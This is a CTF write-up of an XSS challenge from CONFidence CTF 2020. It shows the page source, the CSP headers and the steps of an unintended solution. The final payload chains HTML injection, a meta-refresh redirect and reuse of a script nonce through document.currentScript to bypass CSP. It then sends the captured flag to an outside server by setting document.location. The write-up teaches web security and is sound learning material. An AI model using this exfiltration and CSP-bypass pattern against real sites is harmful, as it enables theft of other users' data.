<h2>Yet Another Yet Another Cat Challenge Part 1/2</h2>

<h3>Description</h3>

<blockquote>Yet Another Cat Challenge for you! Just another boring add/remove/share note app, but with 8 different cats!

http://yayacc.zajebistyc.tf</blockquote>



<p>One day when I was chatting with my friend <a href="https://gynvael.coldwind.pl/">Gynvael</a>, and he told me about a hard XSS challenge from CONFidence CTF 2020 that he faced. So I decided to give it a try and see what is going on. He gave me two hints:</p>
<ol>
 <li>HTML injection.</li>
 <li>Location of XSS should be at theme style selection. (Though there is intended and unintended solution, we will cover intended in part 2).</li>
</ol><br>
<p>So in this challenge after we login, we get to the page where we can add a "note". Looking at the raw HTML we get this:</p>

![addnote](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/entrypage.png)

```javascript
<html>
<head>
    <title>Yet Another Cat Challenge</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
          integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="/flag?var=flag" nonce="0vOlzlwTCvS5btb6IkPB1Q"></script>
    <script src="https://www.google.com/recaptcha/api.js?render=6Le09cUZAAAAAN4r7Ushpf0tdpAowD0LNE1gNsHI"></script>
    <script nonce="0vOlzlwTCvS5btb6IkPB1Q">
        window.onload = function()
        {
            document.getElementById('hello').innerText += ' ' + flag;
        }
        grecaptcha.ready(function() {
            grecaptcha.execute('6Le09cUZAAAAAN4r7Ushpf0tdpAowD0LNE1gNsHI', {action:'validate_captcha'})
                  .then(function(token) {
            // add token value to form
            captchas = document.getElementsByName('g-recaptcha-response')
            for(var i = 0; i < captchas.length; i++)
                captchas[i].value = token;
        });
    });
    
    </script>
</head>
<body>
<div id="hello">
    Hello pkellerman, the flag is:
</div>
<ul class="list-group">
    
</ul>
<a href="/note" class="btn btn-primary">Add note</a>
</body>
</html>
```

<p>We can see there is a script tag with src pointing to <code>/flag?var=flag</code>. If we follow that path we obviously won't get the real flag since we are not an admin.<br>If we click Add Note, we get a form with content and cat options to choose. The page HTML source looks like this:</p>

```javascript
<html>
    <head>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script nonce="_uqFLtygAarWEsN-Lmv16g">
    document.scripts[0].remove()
    blackTheme = 'background-color: #000000; color: #ffffff';
    whiteTheme = 'background-color: #eeeeee; color: #111111';    

    // stolen from http://www.yaldex.com/FSBackground/BouncingImage.htm
    var img;

[...]

    function start() {
    img = document.createElement('img');
    img.src = '/static/cats/lusia.png';
    img.style = 'position: absolute; width: 200px';
    document.body.appendChild(img);
    interval = setInterval(changePos,delay);
    document.body.style = whiteTheme;
    }
    window.onload = start;
    </script>
    </head>
    <body>
        <div class="container">
[...]
            <div>
                Theme:
            <a href="?theme=whiteTheme">white</a> <a href="?theme=blackTheme">black</a>
[...]
```

This HTML is sent with the following HTTP response headers: 

```javascript
Connection: keep-alive
Content-Encoding: gzip
Content-Security-Policy: default-src 'none'; form-action 'self'; frame-ancestors 'none'; style-src https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css; img-src 'self'; script-src 'nonce-VWn7r5GTbTcLZSqYM4JutQ' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/; frame-src https://www.google.com/recaptcha/
content-security-policy: noscript-marker;font-src http:;media-src http:;object-src http:
Content-Type: text/html; charset=utf-8
Date: Wed, 16 Sep 2020 17:40:08 GMT
Server: nginx/1.19.1
Transfer-Encoding: chunked
Vary: Accept-Encoding
Vary: Cookie
X-DNS-Prefetch-Control: off
```

<p>From all of this we can see few things: there is a CSP rule with <code>img-src</code> set to 'self' which is only going to allow same origin images, and script-src with unique nonce which is going to allow executing only those scripts that have a valid nonce value (nonce value is random for every request). Selected cat is being added inside of that <code>start()</code> function as img.src, content is being added to container div and we do have option to change the theme color from White to Black. We can also either delete the current note or go back and share it with an admin.</p>

<h3>Solution (Unintended)</h3>

<p>First step is the aforementioned HTML injection which we can achieve by changing the <code>select</code> tag to either <code>input</code> or <code>textarea</code> for cat selection. <b>Note that both the intended and unintended solutions will require those steps.</b><br>Inputting various special characters as payload we can see that some of them are not being escaped.

```javascript
img.src = '!"#$%&\&apos;()*+,-./:;<=>?@[\\]^_`{|}~';
```
There are certain characters that are not being escaped which is going to be important. Those are: slashes, single quotes, backticks, less than and greater than sign, and so on. <br>
And that is all fine, but there are some crucial questions to be asked. Since we know that <b><code>/flag?var=flag</code></b> is only accessible by an admin (or rather to say only admin can see the real flag), we will need to make a note with XSS and share it with the admin to retrieve the flag that is on that endpoint. The questions are: </p>
<ol>
<li><b>How are we going to bypass CSP?</b></li>
<li><b>How are we going to perform that XSS through theme selection?</b></li>	
</ol>
<br>
<h4><i>Bypass CSP</i></h4>

<p>We know that CSP isn't going to allow Ajax requests (default-src 'self' - fallback) to different domains, so how are we going to find an answer to question number 1? Or to be more precise how to make a request without JavaScript and Ajax? This one was pretty hard to figure out, but after talking to Gynvael and doing some research one thing came up:  <code><b>http-equiv="refresh" content="0; URL=..."</b></code>. Pretty interesting that I've forgot about this <b>meta tag</b> attribute - it is actually refreshing the page and can do a redirect, which happens to be exactly what we need.<br>Since he gave me a hint that XSS will be located at the theme selection, let’s try it out:</p>

![theme_xss_example](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/theme_xss_example.png)

<p>It does execute an alert as we see. Now comes the really hard part which is basically connecting the two steps together. We need to redirect the admin to the note where our XSS will trigger, grab the flag and send it to our server.</p>

<h4><i>Making of the payload</i></h4>

<p>I've created a test "note" and performed an HTML injection that I described above. First we can escape from the script tag where our JavaScript lives by closing script tag at the beginning of the payload, that will successfully bypass single quotes that is not being escaped. With that we are escaping the JavaScript context and we can followup with the refresh meta tag (Step 1 payload example). For example:</p>

```javascript
</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/flag?var=flag">
```
<p>Testing this successfully redirected us to the flag query path which is a good thing.<br>Connecting to Step 2 now, we have to craft an actual XSS script that we will inject in our selected "theme" and share that note with the admin, which in turn will force admin's browser to make a request to our server where we will store the request (and the flag). We know that script will be concatenated to <code>document.body.style</code> because that is where the theme is being set inside that start function (and from our alert example). So creating a new script and appending it to the DOM should be easy, right?<br> Well yea... but not really. There is a hard part – we have to bypass the CSP with that <code>script nonce</code>(Only script with nonce value will be executed). Though if you scroll up to the start of the script tag you will see the following piece of code on the very next line: <code>document.scripts[0].remove()</code>.<br>I did think it's going be straight forward from here, but it won't because of that line there... Gynvael gave me a hint-by-question: is the script really being removed or is there a reference kept somewhere? And yes there was a reference.<br>The answer to this is: <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document/currentScript">document.currentScript<a>.<br>
</p>
<p>In the docs you can find this:</p>

<blockquote>

```javascript
The Document.currentScript property returns the script element whose script is currently being processed and isn't a JavaScript module. (For modules use import.meta instead.)
It's important to note that this will not reference the script element if the code in the script is being called as a callback or event handler; it will only reference the element while it's initially being processed.

```

</blockquote>

<p>That is exactly what we need! The script’s nonce attribute while is being executed, we will grab that nonce and add it to our newly created script with src <code>/flag?var=flag</code>. This way we will have flag as a global variable and we just have to exfiltrate it to our server. And this is achievable with <code>document.location</code> which is going to make a GET request to our server with the flag being sent in the query string.<br> </p>
<br>
<p>Now we just created a new note with some random content, did the HTML injection, and inserted the payload as shown below. Meta refresh tag URL is linking to previous note that we've made.</p>

<p>Our final payload should look like this:</p>

```javascript
</script><meta http-equiv="refresh" content="0;URL=http://yayacc.zajebistyc.tf/note/48ab77af-f06d-48d5-a6d2-fba6ddcc8227?theme=`color:red`;}var oldsc=document.currentScript.nonce;var sc =document.createElement(`script`);sc.nonce=oldsc;sc.src=`/flag?var=flag`;document.querySelector(`html`).appendChild(sc);setTimeout(function(){document.location=`https://ctf.warriordev.com/ctfserver/ref?flag=${flag}`},100);{//

```

<b>FLAG:</b>

![flag](https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/flag.png)

<h4><i>Diagram</i></h4>
<p>This is just my random drawing to visualize what is going on.</p>

<img src="https://github.com/DejanJS/CONFidence-CTF-2020-yayacc/blob/master/diagram.png" width="1100px" height="700px">

<h4>Summary part 1</h4>
<p>This challenge was complex and has been made in pretty realistic scenario. Props to folks from <a href="https://p4.team/">p4</a> especially <b>sasza</b>. I hope part one of this writeup will help someone to understand wider complexity of XSS attacks, just like writing this down helped me to fully grasp the concepts behind this and to expand my knowledge.</p>

<h3>To be continued...</h3>

